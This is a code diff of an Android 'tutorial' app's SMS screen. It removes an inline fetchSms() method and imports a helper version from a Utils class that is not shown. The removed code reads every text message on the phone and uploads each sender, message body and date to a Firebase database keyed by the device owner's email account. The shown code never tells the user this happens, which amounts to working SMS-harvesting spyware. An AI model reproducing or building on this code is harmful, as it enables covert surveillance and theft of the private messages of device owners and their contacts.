@@ -8,27 +8,20 @@ import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
-import android.text.format.DateFormat;
 import android.view.View;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 import android.widget.Toast;
 
 import com.android.tutorial.R;
-import com.android.tutorial.utils.MyDevice;
-import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
 
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+
+import static com.android.tutorial.utils.Utils.fetchSms;
 
 public class SMSActivity extends AppCompatActivity {
 
-    private DatabaseReference mFirebaseDatabase;
-    private FirebaseDatabase mFirebaseInstance;
     Cursor cursor;
 
     @Override
@@ -40,73 +33,13 @@ public class SMSActivity extends AppCompatActivity {
         getSupportActionBar().setDisplayHomeAsUpEnabled(true);
         fab();
 
-        mFirebaseInstance = FirebaseDatabase.getInstance();
-
-        // get reference to 'users' node
-        mFirebaseDatabase = mFirebaseInstance.getReference();
-
         ListView lViewSMS = (ListView) findViewById(R.id.listViewSMS);
-        if (fetchSms() != null) {
-            ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, fetchSms());
+        if (fetchSms(SMSActivity.this) != null) {
+            ArrayAdapter adapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, fetchSms(SMSActivity.this));
             lViewSMS.setAdapter(adapter);
         } else {
             Toast.makeText(this, "Can't read SMS.", Toast.LENGTH_SHORT).show();
         }
-    }
-
-    public ArrayList fetchSms() {
-        ArrayList sms = new ArrayList();
-        Uri message = Uri.parse("content://sms/");
-        ContentResolver cr = SMSActivity.this.getContentResolver();
-
-        Cursor cursor = cr.query(message, null, null, null, null);
-        SMSActivity.this.startManagingCursor(cursor);
-        int totalSMS = cursor.getCount();
-        String readStatus = "";
-        long millisecond;
-        if (cursor.moveToFirst()) {
-            for (int i = 0; i < totalSMS; i++) {
-                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
-                    readStatus = "inbox";
-                } else {
-                    readStatus = "sent";
-                }
-
-                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
-                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();
-
-                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
-                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
-                        + "\nDATE:" + dateString
-                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
-                        + "\nReadStatus:" + readStatus);
-
-                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
-                Matcher match = pt.matcher(senderAddress);
-                while (match.find()) {
-                    String s = match.group();
-                    senderAddress = senderAddress.replaceAll("\\" + s, "");
-                }
-
-                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SMSActivity.this)
-//                                MyDevice.getDeviceName()
-                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
-                        .child(senderAddress)
-                        .child(readStatus)
-                        .child("" + i)
-                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
-                                + " " + dateString
-                        );
-                cursor.moveToNext();
-            }
-        }
-        // else {
-        // throw new RuntimeException("You have no SMS");
-        // }
-        cursor.close();
-
-        return sms;
     }
 
     public void onDestroy() {
